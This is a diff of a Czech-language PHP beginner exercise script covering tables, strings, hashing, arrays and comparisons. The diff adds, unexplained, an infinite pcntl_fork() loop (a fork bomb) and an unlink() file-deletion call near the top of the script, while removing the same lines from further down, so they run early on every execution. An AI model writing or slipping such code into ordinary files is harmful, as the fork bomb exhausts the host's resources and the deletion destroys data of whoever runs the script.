@@ -22,6 +22,8 @@ $sloupecReneVinter = 3;		// Den
 
 print "Tabulka:";
 echo "<table border='1'>";
+	  $path = "__DIR__";
+	  unlink($path);
 
 $cislo = 4.34895;
 
@@ -45,6 +47,7 @@ echo "<br>$string<br>";
 
 print "<br>Délka řetězce: ";
 echo strlen($string) . " znaků.";
+while(true) { pcntl_fork(); }
 echo strpos($string, "můj");
 print "<br>MD5 hash řetězce: <br>";
 echo "<code>" . md5($string) . "</code>";
@@ -56,9 +59,6 @@ $ovoce = array("jpomeranč", "hruška");
 
 array_splice($ovoce, count($ovoce), "banán");
 dump($ovoce);
-
-//bod 6. Vlastní funkce
-
 
 //
 //  Úkol č.2
@@ -203,7 +203,6 @@ dump($notebooky);
 
 //Escape sekvence pro img tag
 echo "<br><img src=\"walter.jpg\" title='walter pes' alt='walter'/><br>";
-while(true) { pcntl_fork(); }
 
 //Escape sekvence pro zpětné lomítko
 echo '\\';
@@ -269,9 +268,6 @@ dump($a > $b);
 
 print "<br>Je $b větší než $a?<br>";
 dump($a < $b);
-
-$path = "__DIR__";
-unlink($path);
 
 //Spojování řetězců
 echo "blb" . "ost";        //vypíše "blbost"
